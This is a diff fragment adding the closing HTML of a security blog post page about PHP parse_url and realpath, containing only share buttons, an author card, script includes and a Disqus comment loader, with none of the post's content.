+                    class="post-action-btn btn btn--default"
+                    target="new" href="https://www.facebook.com/sharer/sharer.php?u=https://blog.theo.com.tw/Research/PHP-The-issue-between-parse-url-and-real-path/"
+                    title="Share on Facebook"
+                    aria-label="Share on Facebook"
+                >
+                    <i class="fab fa-facebook" aria-hidden="true"></i>
+                </a>
+            </li>
+        
+            
+            
+            <li class="post-action hide-xs">
+                <a
+                    class="post-action-btn btn btn--default"
+                    target="new" href="https://twitter.com/intent/tweet?text=https://blog.theo.com.tw/Research/PHP-The-issue-between-parse-url-and-real-path/"
+                    title="Share on Twitter"
+                    aria-label="Share on Twitter"
+                >
+                    <i class="fab fa-twitter" aria-hidden="true"></i>
+                </a>
+            </li>
+        
+        
+            
+                <li class="post-action">
+                    <a
+                        class="post-action-btn btn btn--default"
+                        href="#disqus_thread"
+                        aria-label="Leave a comment"
+                    >
+                        <i class="fa fa-comment"></i>
+                    </a>
+                </li>
+            
+        
+        <li class="post-action">
+            
+                <a class="post-action-btn btn btn--default" href="#table-of-contents" aria-label="Table of Contents">
+            
+                <i class="fa fa-list" aria-hidden="true"></i>
+            </a>
+        </li>
+    </ul>
+</div>
+
+
+                </div>
+                
+    <div id="share-options-bar" class="share-options-bar" data-behavior="2">
+        <i id="btn-close-shareoptions" class="fa fa-times"></i>
+        <ul class="share-options">
+            
+                
+                
+                <li class="share-option">
+                    <a
+                        class="share-option-btn"
+                        target="new"
+                        href="https://www.facebook.com/sharer/sharer.php?u=https://blog.theo.com.tw/Research/PHP-The-issue-between-parse-url-and-real-path/"
+                        aria-label="Share on Facebook"
+                    >
+                        <i class="fab fa-facebook" aria-hidden="true"></i><span>Share on Facebook</span>
+                    </a>
+                </li>
+            
+                
+                
+                <li class="share-option">
+                    <a
+                        class="share-option-btn"
+                        target="new"
+                        href="https://twitter.com/intent/tweet?text=https://blog.theo.com.tw/Research/PHP-The-issue-between-parse-url-and-real-path/"
+                        aria-label="Share on Twitter"
+                    >
+                        <i class="fab fa-twitter" aria-hidden="true"></i><span>Share on Twitter</span>
+                    </a>
+                </li>
+            
+        </ul>
+    </div>
+
+
+            
+        </div>
+        
+
+
+    
+
+<div id="about">
+    <div id="about-card">
+        <div id="about-btn-close">
+            <i class="fa fa-times"></i>
+        </div>
+        
+            <img id="about-card-picture" src="https://www.gravatar.com/avatar/9b495e199d8dad2130ecb4407dca4176?s=110" alt="Author&#39;s picture"/>
+        
+            <h4 id="about-card-name">Theo Chen</h4>
+        
+            <div id="about-card-bio"><p>Penetration Testing &#x2F; Malware Analysis &#x2F; Threat Hunting &#x2F; APT Research<br /><br />Ingress Enlightened Agent</p>
+</div>
+        
+        
+            <div id="about-card-job">
+                <i class="fa fa-briefcase"></i>
+                <br/>
+                <p>Threat Researcher</p>
+
+            </div>
+        
+        
+            <div id="about-card-location">
+                <i class="fa fa-map-marker-alt"></i>
+                <br/>
+                Taipei, Taiwan
+            </div>
+        
+    </div>
+</div>
+
+        
+        
+<div id="cover" style="background-image:url('/assets/images/cover.jpg');"></div>
+        <!--SCRIPTS-->
+
+<script src="/assets/js/script-ntjm1xxqdwr7uhkrlwal4hkgsjrprt8jr4d5cauo3fpjpjoa3nude4bnfikw.min.js"></script>
+
+<!--SCRIPTS END-->
+
+
+    
+        <script>
+          var disqus_config = function() {
+            this.page.url = 'https://blog.theo.com.tw/Research/PHP-The-issue-between-parse-url-and-real-path/';
+              
+            this.page.identifier = 'Research/PHP-The-issue-between-parse-url-and-real-path/';
+              
+          };
+          (function() {
+            var d = document, s = d.createElement('script');
+            var disqus_shortname = 'theo-5';
+            s.src = '//' + disqus_shortname + '.disqus.com/embed.js';
+
+            s.setAttribute('data-timestamp', +new Date());
+            (d.head || d.body).appendChild(s);
+          })();
+        </script>
+    
+
+
+
+
+    </body>
+</html>
